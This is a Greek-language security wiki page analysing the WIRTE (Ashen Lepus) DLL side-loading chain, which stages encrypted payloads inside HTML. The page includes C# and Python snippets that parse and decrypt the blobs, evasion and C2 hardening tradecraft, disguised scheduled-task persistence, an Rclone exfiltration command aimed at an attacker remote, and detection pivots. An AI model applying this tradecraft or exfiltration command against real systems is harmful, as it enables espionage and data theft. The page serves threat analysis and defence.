# Προηγμένο DLL Side-Loading με HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση Tradecraft

Το Ashen Lepus (aka WIRTE) weaponized ένα επαναλαμβανόμενο pattern που αλυσιδώνει DLL sideloading, staged HTML payloads, και modular .NET backdoors για να παραμείνει μέσα σε Middle Eastern diplomatic networks. Η technique είναι επαναχρησιμοποιήσιμη από κάθε operator επειδή βασίζεται σε:

- **Archive-based social engineering**: αθώα PDFs καθοδηγούν τους targets να κατεβάσουν ένα RAR archive από ένα file-sharing site. Το archive περιλαμβάνει ένα real-looking document viewer EXE, ένα malicious DLL με όνομα από trusted library (π.χ. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), και ένα decoy `Document.pdf`.
- **DLL search order abuse**: το victim κάνει double-click στο EXE, τα Windows επιλύουν το DLL import από τον current directory, και ο malicious loader (AshenLoader) εκτελείται μέσα στο trusted process ενώ το decoy PDF ανοίγει για να μην κινήσει υποψίες.
- **Living-off-the-land staging**: κάθε μεταγενέστερο stage (AshenStager → AshenOrchestrator → modules) μένει off disk μέχρι να χρειαστεί, και παραδίδεται ως encrypted blobs κρυμμένα μέσα σε κατά τα άλλα harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: το EXE side-loads το AshenLoader, το οποίο κάνει host recon, AES-CTR το encrypts, και το POSTs μέσα σε rotating parameters όπως `token=`, `id=`, `q=`, ή `auth=` σε API-looking paths (π.χ. `/api/v2/account`).
2. **HTML extraction**: το C2 αποκαλύπτει το επόμενο stage μόνο όταν το client IP geolocates στη target region και το `User-Agent` ταιριάζει με το implant, frustrat­ing sandboxes. Όταν οι checks περάσουν το HTTP body περιέχει ένα `<headerp>...</headerp>` blob με το Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: το AshenStager αναπτύσσεται με ένα άλλο legitimate binary που imports `wtsapi32.dll`. Το malicious copy που injected μέσα στο binary fetches περισσότερα HTML, αυτή τη φορά carving `<article>...</article>` για να recover το AshenOrchestrator.
4. **AshenOrchestrator**: ένας modular .NET controller που decodes ένα Base64 JSON config. Τα `tg` και `au` fields του config concatenated/hashed into the AES key, η οποία decrypts το `xrk`. Τα resulting bytes λειτουργούν ως XOR key για κάθε module blob που fetches afterwards.
5. **Module delivery**: κάθε module περιγράφεται μέσω HTML comments που redirect τον parser σε ένα arbitrary tag, σπάζοντας static rules που κοιτούν μόνο για `<headerp>` ή `<article>`. Τα modules περιλαμβάνουν persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), και file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Ακόμα κι αν οι αμυνόμενοι μπλοκάρουν ή αφαιρέσουν ένα συγκεκριμένο στοιχείο, ο χειριστής χρειάζεται μόνο να αλλάξει το tag που υποδεικνύεται στο HTML comment για να συνεχίσει την παράδοση.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Πρόσφατη έρευνα για HTML smuggling (Talos) αναδεικνύει payloads κρυμμένα ως Base64 strings μέσα σε `<script>` blocks σε HTML attachments και decoded μέσω JavaScript κατά το runtime. Το ίδιο trick μπορεί να επαναχρησιμοποιηθεί για C2 responses: stage encrypted blobs μέσα σε ένα script tag (ή άλλο DOM element) και decode them in-memory πριν από AES/XOR, κάνοντας τη σελίδα να μοιάζει με συνηθισμένο HTML. Το Talos δείχνει επίσης layered obfuscation (identifier renaming plus Base64/Caesar/AES) μέσα σε script tags, κάτι που αντιστοιχεί καθαρά σε HTML-staged C2 blobs. Ένα μεταγενέστερο Talos writeup για **hidden text salting** είναι επίσης relevant εδώ: το να σπάς το Base64 με άσχετα HTML comments ή whitespace αρκεί για να χαλάσει απλούς regex extractors, ενώ η ανακατασκευή από την πλευρά του browser παραμένει trivial.

## Recent Variant Notes (2024-2025)

- Το Check Point παρατήρησε WIRTE campaigns το 2024 που εξακολουθούσαν να βασίζονται σε archive-based sideloading αλλά χρησιμοποιούσαν το `propsys.dll` (stagerx64) ως first stage. Το stager decodes το επόμενο payload με Base64 + XOR (key `53`), στέλνει HTTP requests με hardcoded `User-Agent`, και εξάγει encrypted blobs embedded ανάμεσα σε HTML tags. Σε ένα branch, το stage reconstructed από μια μεγάλη λίστα embedded IP strings decoded via `RtlIpv4StringToAddressA`, και έπειτα concatenated into the payload bytes.
- Το OWN-CERT τεκμηρίωσε παλαιότερο WIRTE tooling όπου το side-loaded `wtsapi32.dll` dropper προστάτευε strings με Base64 + TEA και χρησιμοποιούσε το ίδιο το DLL name ως το decryption key, και στη συνέχεια XOR/Base64-obfuscated host identification data πριν το στείλει στο C2.

## Reconstructing IP-Encoded Stages

Το 2024 `propsys.dll` branch του WIRTE δείχνει ότι το επόμενο PE δεν χρειάζεται να υπάρχει ως ένα ενιαίο HTML blob. Ο loader μπορεί να αποθηκεύσει stage bytes ως dotted-quad strings και να τα ξαναχτίσει με `RtlIpv4StringToAddressA`, ένα pattern στενά σχετικό με το **IPfuscation** tradecraft του Hive. Operationally αυτό είναι χρήσιμο όταν ο actor θέλει η HTML page να περιέχει κάτι που μοιάζει με αθώα IOCs ή config data αντί για ένα προφανές Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Εάν τα bytes που ανακτήθηκαν αρχίζουν με `MZ`, πιθανότατα ανακατασκεύασες απευθείας το επόμενο PE. Αν όχι, έλεγξε για ένα leading XOR/Base64 layer ή μικρά delimiter chunks ανάμεσα στις διευθύνσεις.

## Swappable DLL Names & Host Rotation

Μια ισχυρή ιδιότητα αυτού του pattern είναι ότι το **HTML/AES/XOR staging backend μπορεί να παραμένει ίδιο ενώ αλλάζει μόνο το sideload pair**. Το WIRTE εναλλασσόταν μεταξύ `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, και `propsys.dll` σε διάφορες campaigns, κάτι που είναι χρήσιμο επειδή:

- Τα `propsys.dll` και `wtsapi32.dll` είναι βαρετά Windows DLL ονόματα που οι defenders περιμένουν να υπάρχουν στο `%System32%` / `%SysWOW64%`.
- Δημόσια catalogs όπως το **HijackLibs** ήδη χαρτογραφούν πολλά binaries που θα φορτώσουν αυτά τα DLL names από έναν αντιγραμμένο application directory, δίνοντας στους operators replacement hosts χωρίς να χρειάζεται επανασχεδιασμός του stager.
- Μόνο η export surface πρέπει να προσαρμόζεται ανά host. Το HTML parser, οι AES/XOR routines, και το module loader συνήθως μπορούν να μεταφερθούν αυτούσια σε ένα forwarding proxy DLL.

Για offensive lab work, αυτό σημαίνει ότι μπορείς να χωρίσεις το πρόβλημα σε **(1) βρες έναν σταθερό signed host που επιλύει το επιλεγμένο σου DLL name τοπικά** και **(2) επανάχρησε την ίδια staged-HTML loader λογική πίσω από αυτό το DLL**.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: οι τρέχοντες loaders ενσωματώνουν 256-bit keys μαζί με nonces (π.χ. `{9a 20 51 98 ...}`) και προαιρετικά προσθέτουν ένα XOR layer χρησιμοποιώντας strings όπως `msasn1.dll` πριν/μετά το decryption.
- **Key material variations**: παλαιότεροι loaders χρησιμοποιούσαν Base64 + TEA για να προστατεύσουν embedded strings, με το decryption key να προκύπτει από το malicious DLL name (π.χ. `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: οι staging servers διαχωρίζονται ανά tool, φιλοξενούνται σε διαφορετικά ASNs, και μερικές φορές προβάλλονται μέσω subdomains που μοιάζουν νόμιμα, ώστε το κάψιμο ενός stage να μην αποκαλύπτει τα υπόλοιπα.
- **Recon smuggling**: τα enumerated data πλέον περιλαμβάνουν Program Files listings για τον εντοπισμό high-value apps και πάντα κρυπτογραφούνται πριν φύγουν από τον host.
- **URI churn**: τα query parameters και τα REST paths εναλλάσσονται μεταξύ campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), ακυρώνοντας brittle detections.
- **User-Agent pinning + safe redirects**: η C2 infrastructure απαντά μόνο σε ακριβείς UA strings και αλλιώς κάνει redirect σε benign news/health sites για να περνά απαρατήρητη.
- **Gated delivery**: οι servers είναι geo-fenced και απαντούν μόνο σε πραγματικά implants. Μη εγκεκριμένοι clients λαμβάνουν μη ύποπτο HTML.

## Persistence & Execution Loop

Το AshenStager ρίχνει scheduled tasks που παριστάνουν Windows maintenance jobs και εκτελούνται μέσω `svchost.exe`, π.χ.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Αυτά τα tasks επανεκκινούν το sideloading chain στο boot ή σε χρονικά διαστήματα, διασφαλίζοντας ότι το AshenOrchestrator μπορεί να ζητά φρέσκα modules χωρίς να αγγίζει ξανά το disk.

## Using Benign Sync Clients for Exfiltration

Οι operators τοποθετούν diplomatic documents μέσα στο `C:\Users\Public` (world-readable και μη ύποπτο) μέσω ενός dedicated module, και στη συνέχεια κατεβάζουν το νόμιμο [Rclone](https://rclone.org/) binary για να συγχρονίσουν αυτόν τον κατάλογο με attacker storage. Η Unit42 σημειώνει ότι αυτή είναι η πρώτη φορά που αυτός ο actor παρατηρείται να χρησιμοποιεί Rclone για exfiltration, κάτι που ευθυγραμμίζεται με τη γενικότερη τάση κατάχρησης νόμιμων sync tooling ώστε να μοιάζουν με κανονική κίνηση:

1. **Stage**: αντιγραφή/συλλογή target files στο `C:\Users\Public\{campaign}\`.
2. **Configure**: αποστολή ενός Rclone config που δείχνει σε attacker-controlled HTTPS endpoint (π.χ. `api.technology-system[.]com`).
3. **Sync**: εκτέλεση `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ώστε η κίνηση να μοιάζει με κανονικά cloud backups.

Επειδή το Rclone χρησιμοποιείται ευρέως για legitimate backup workflows, οι defenders πρέπει να εστιάσουν σε ανώμαλες εκτελέσεις (νέα binaries, περίεργα remotes, ή ξαφνικό syncing του `C:\Users\Public`).

## Detection Pivots

- Κάνε alert σε **signed processes** που απροσδόκητα φορτώνουν DLLs από user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), ειδικά όταν τα DLL names επικαλύπτονται με `netutils`, `srvcli`, `dwampi`, `wtsapi32`, ή `propsys`.
- Εξέτασε ύποπτες HTTPS responses για **μεγάλα Base64 blobs ενσωματωμένα μέσα σε ασυνήθιστα tags** ή προστατευμένα από `<!-- TAG: <xyz> -->` comments.
- Κανονικοποίησε πρώτα το HTML: **αφαίρεσε comments και σύμπτυξε whitespace πριν από το Base64 extraction**, επειδή το hidden-text-salting style evasion μπορεί να σπάει payloads σε comment boundaries.
- Επέκτεινε το HTML hunting σε **Base64 strings μέσα σε `<script>` blocks** (HTML smuggling-style staging) που αποκωδικοποιούνται μέσω JavaScript πριν από το AES/XOR processing.
- Αναζήτησε επαναλαμβανόμενες κλήσεις σε **`RtlIpv4StringToAddressA` ακολουθούμενες από buffer assembly**, ειδικά όταν τα surrounding strings είναι μεγάλα IPv4 lists και όχι πραγματικοί network targets.
- Αναζήτησε **scheduled tasks** που εκτελούν `svchost.exe` με non-service arguments ή δείχνουν πίσω σε dropper directories.
- Παρακολούθησε **C2 redirects** που επιστρέφουν payloads μόνο για ακριβή `User-Agent` strings και αλλιώς κάνουν bounce σε legitimate news/health domains.
- Παρακολούθησε για **Rclone** binaries που εμφανίζονται εκτός IT-managed locations, νέα `rclone.conf` files, ή sync jobs που τραβούν από staging directories όπως το `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
